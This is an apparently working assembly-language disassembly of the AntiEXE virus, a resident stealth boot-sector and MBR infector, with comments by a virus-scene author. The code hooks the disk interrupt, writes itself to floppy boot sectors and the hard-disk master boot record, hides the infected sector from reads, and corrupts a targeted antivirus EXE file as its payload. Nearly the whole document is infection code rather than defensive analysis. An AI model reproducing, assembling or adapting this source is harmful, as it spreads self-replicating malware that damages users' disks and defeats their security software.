
; I disassembled AntiEXE as LONG time ago, when I was still in the beginners-
; stage, that's why some things aren't correct in the commenting. I'm just
; sick 2 death of looking at this piece of shit!

;============================================================================
;
;     NAME: AntiEXE virus.
;     TYPE: Resident stealth bootsector/MBR infector.
;   LENGTH: 1 sector.
;   ORIGIN: Russia.
;   STATUS: Extremely common.
;     DATE: January 1998 - May 1998.
;
; Disassembly was done by T-2000 / Invaders.
;
; This is a rather badly written virus, it uses the extended DPB for it's
; own code. The rest is functional OK, but theoretical very shoddy. It is
; the stupiest programming I've ever saw, but it works.
;
; The only smart thing in AntiEXE is that the hiding-location is calculated
; instead of predefined. This way it can infect *ANY* disk-format.
;
;  PAYLOAD: While a sector is read, there is a chance that the virus checks
;           if the sector is starting with MZ and some other header-values.
;           This may be the case when a .EXE-file is executed/read. It then
;           corrupts the .EXE-file in the buffer.
;
; Ah, now I see it, it's a lame Stoned-variant!
;
;           The targetted .EXE-file seems to be a Russian anti-virus product.
;
;============================================================================


	.MODEL  TINY
	.CODE

	JMP     Real_Start              ; Jump to virus entrypoint.
	DB      4Dh                     ; ID-byte.

Track_Sector    DW      0Fh                     ; Track & sector of bootsec.
Head            DB      01h
Function        DW      3620h                   ; Function called.

	DB      2Eh, 30h, 00h, 02h      ; Junk-bytes.


	; === Bios Parameter Block (BPB). ===

	DB      01h                     ; Sectors per cluster.
	DW      01h                     ; Hidden sectors.
	DB      02h                     ; Number of FATs.
	DW      00E0h                   ; Max # root-entries.
	DW      0B40h                   ; Number of sectors.
	DB      0F0h                    ; Media descriptor-byte.
	DW      09h                     ; Sectors of single FAT.
	DW      12h                     ; Sectors per track.
	DW      02h                     ; Number of heads.
	DW      0                       ; Hidden sectors.


; === Data used to determine if the target-file is in the buffer. ===

Exe_Data  DW      'ZM'                    ; .EXE-marker.
	  DW      0040h                   ; Filesize MOD 512.
	  DW      0188h                   ; 512-byte pages.
	  DW      0F37h                   ; Number relocation tables.

	  DB      0E0h                    ; Junk-byte.

NewInt13h:
	CMP     AH, 0F9h                ; This may be an unfinished
	JE      Int13h_Exit             ; residency-check.

	MOV     CS:Function, AX         ; Save function #.

	INT     0D3h                    ; Run function.
	JC      Int13h_Exit             ; Abort if error occurred.

	PUSHF

	CMP     BYTE PTR CS:Function+1, 02h    ; Read?
	JNE     Int13h_End

	PUSH    CX
	PUSH    SI
	PUSH    DI
	PUSH    DS

	SUB     CX, CX                  ; 25% chance for skipping
	MOV     DS, CX                  ; the buffercheck.

	TEST    BYTE PTR DS:46Ch, 00000011b   ; Clock counter.
	JZ      Check_Reading_Boot

	PUSH    CS
	POP     DS

	MOV     DI, BX

Check_Sector:
	;LEA     SI, Exe_Data           ; Load effective addr
	DB       8DH, 36H, 1EH, 00H     ;  Fixup - byte match
	MOV     CX, 8
	PUSH    DI
	REPE    CMPSB
	POP     DI
	JZ      Damage_File             ; Target .EXE-file?
	ADD     DI, 512                 ; Next sector in buffer.
	DEC     BYTE PTR CS:Function    ; Decrease sectors to check.
	JNZ     Check_Sector
	JMP     Check_Reading_Boot

Damage_File:    STOSB                   ; Overwrite the .EXE-marker
                                        ; so DOS won't execute file.

Check_Reading_Boot:

	POP     DS
	POP     DI
	POP     SI
	POP     CX

	CMP     CX, 01h                 ; Reading sector 1?
	JNE     Int13h_End

	CMP     DH, 0                   ; Head zero?
	JNZ     Int13h_End              ; (thus bootsector).

	CALL    Infect_Drive            ;

Int13h_End:     POPF

Int13h_Exit:    RETF    2


Infect_Drive:
	PUSH    AX                      ; Save all registers.
	PUSH    BX
	PUSH    CX
	PUSH    DX
	PUSH    DS
	PUSH    ES
	PUSH    SI
	PUSH    DI

	PUSH    ES
	POP     DS

	MOV     AX, CS:[00h]            ; Compare 1st word us to 1st
	CMP     AX, [BX]                ; word of read bootsector.
	JNE     Infect

	MOV     AX, CS:[02h]            ; Do the same with 2nd word.
	CMP     AX, [BX+2]
	JNE     Infect

; We have a infected bootsector in the buffer, so we need to stealth it.
 
	MOV     CX, [BX+OFFSET Track_Sector]  ; Read original bootsector.
	MOV     DH, [BX+OFFSET Head]
	MOV     AX, 0201h
	INT     0D3h

	JMP     SHORT Abort_Infect
Infect:
	CMP     DL, 01h                 ; A: or B: drive?
	JA      Abort_Infect            ; Not, then abort infect.

	MOV     AX, [BX+16h]            ; Sectors per FAT,
	MUL     BYTE PTR [BX+10h]       ; multiplied by # of FATs,
	ADD     AX, [BX+0Eh]            ; plus # of reserved sectors.

	PUSH    DX

	MOV     CL, 4
	MOV     DX, [BX+11h]            ; Max. # of root-dir entries,
	SHR     DX, CL                  ; divided by 16.

	ADD     AX, DX

	DEC     AX
	MOV     CX, [BX+18h]            ; Sectors per track.

	PUSH    CX

	SHL     CX, 1                   ; MUL 2.
	SUB     DX, DX
	DIV     CX

	POP     CX

	PUSH    AX

	MOV     AX, DX
	SUB     DX, DX
	DIV     CX

	MOV     DH, AL
	MOV     CL, DL

	POP     AX

	MOV     CH, AL
	INC     CL
	POP     AX

	MOV     DL, AL
	MOV     CS:Head, DH             ; Store head.
	MOV     CS:Track_Sector, CX     ; Store Track & sector.
	MOV     AX, 0301h
	INT     0D3h                    ; Store original bootsector.
	JC      Abort_Infect

	PUSH    CS
	POP     ES

	CLD                             ; Store data.
	MOV     DI, OFFSET Function
	MOV     SI, BX
	ADD     SI, DI
	MOV     CX, 23
	REP     MOVSB

	MOV     AX, 0301h               ; Write infected bootsector
	XOR     BX, BX                  ; disk.
	MOV     CX, 01h
	SUB     DH, DH
	INT     0D3h

Abort_Infect:
	POP     DI                      ; Restore registers.
	POP     SI
	POP     ES
	POP     DS
	POP     DX
	POP     CX
	POP     BX
	POP     AX

	RETN


	; === Virus entrypoint at boot-up. ===

Real_Start:
	XOR     DI, DI
	MOV     DS, DI

	LES     DX, DS:[13h * 4]        ; Get INT 13h
	MOV     DS:[0D3h * 4], DX       ; Revector to INT 0D3h.
	MOV     DS:[0D3h *  4 +2 ], ES

	CLI
	MOV     SS, DI                  ; Setup stack.
	MOV     SI, 7C00h
	MOV     SP, SI
	STI

	PUSH    DS
	PUSH    SI
	PUSH    SI

	MOV     AX, DS:[413h]           ; Get total DOS-memory.
	DEC     AX                      ; Steal one kilobyte,
	MOV     DS:[413h], AX           ; and put it back in RAM.

	MOV     CL, 6                   ; Calculate segment.
	SHL     AX, CL                  ; MUL 64.

	MOV     ES, AX

	; Hook INT 13h.

	MOV     WORD PTR DS:[13h * 4 + 2], AX
	MOV     WORD PTR DS:[13h * 4], OFFSET NewInt13h

	PUSH    AX
	MOV     AX, OFFSET Relocated
	PUSH    AX
	MOV     CX, (512 / 2)
	CLD
	REP     MOVSW                   ; Copy virus to our segment.
	RETF                            ; JMP to virussegment.

Relocated:
	XOR     AX, AX
	MOV     ES, AX
	INT     0D3h                    ; Reset drive (which one?).

	PUSH    CS
	POP     DS

	MOV     AX, 0201h
	POP     BX                      ; 7C00h.
	MOV     CX, Track_Sector
	CMP     CX, 13                  ; Are we located on harddisk?
	JNE     On_Diskette
	MOV     DX, 80h
	INT     0D3h                    ; Read original bootsector.

JMP_Bootsector: RETF                            ; JMP to restored bootsector.

On_Diskette:
	SUB     DX, DX                  ; Read original bootsector
	MOV     DH, Head                ; on drive A:
	INT     0D3h
	JC      JMP_Bootsector

	PUSH    CS
	POP     ES

	MOV     AX, 0201h               ; Read MBR of first harddisk.
	MOV     BX, 512
		MOV     CX, 01h
	MOV     DX, 80h
	INT     0D3h
	JC      JMP_Bootsector

	XOR     SI, SI
	LODSW                           ; Get first word bootsector.

	CMP     AX, [BX]                ; Compare it with 1st word
	JNE     Infect_MBR              ; of us.

	LODSW                           ; Get second word.

	CMP     AX, [BX+2]              ; Also compare it with our
	JE      JMP_Bootsector          ; 2nd word.

Infect_MBR:
	MOV     CX, 13                  ; Store original MBR.
	MOV     Track_Sector, CX
	MOV     AX, 0301h
	PUSH    AX
	INT     0D3h
	POP     AX
	JC      JMP_Bootsector

	; Copy partition-table into our body.

	MOV     SI, 512 + OFFSET Partition_Table
	MOV     DI, OFFSET Partition_Table
	MOV     CX, (66 / 2)
	REP     MOVSW                   ; Copy partition-info.
	INC     CX
	SUB     BX, BX
	MOV     Head, DH
	INT     0D3h                    ; Write infected MBR.

	RETF                            ; JMP to restored bootsector.


	; === Partition Table ===

Partition_Table: 

	DB      80h                     ; Boot-indicator.
	DB      01h                     ; Start-head.
	DB      01h                     ; Beginsector.
	DB      00h                     ; Start cylinder.
	DB      06h                     ; System-ID.
	DB      07h
	DB      0EEh
	DB      85h
	DB      2Eh
	DB      00h
	DB      00h
	DB      00h
	DB      72h
	DB      10H, 05H, 00H, 00h
	DB      47 DUP(0)
	DW      0AA55h                  ; Sector bootable-ID.

	END
